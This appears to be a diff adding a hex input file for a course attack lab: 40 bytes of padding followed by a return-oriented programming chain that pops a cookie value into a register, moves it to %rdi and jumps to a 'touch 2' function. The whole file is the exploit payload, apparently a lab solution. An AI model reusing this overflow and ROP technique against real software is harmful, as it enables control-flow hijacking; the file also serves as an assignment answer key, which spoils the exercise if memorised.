@@ -1,0 +1,9 @@
+FF FF FF FF FF FF FF FF  /*  40 byte buffer  */
+FF FF FF FF FF FF FF FF  /*  buffer  */
+FF FF FF FF FF FF FF FF  /*  buffer  */
+FF FF FF FF FF FF FF FF  /*  buffer  */
+FF FF FF FF FF FF FF FF  /*  buffer  */
+CC 19 40 00 00 00 00 00  /*  gadget 1 + 2 to access 58 (pop %rax)  */
+FA 97 B9 59 00 00 00 00  /*  cookie  */
+C5 19 40 00 00 00 00 00  /*  gadget 2 + 2 to access 48 89 C7 (mov %rax to %rdi)  */
+EC 17 40 00 00 00 00 00  /*  touch 2 address  */
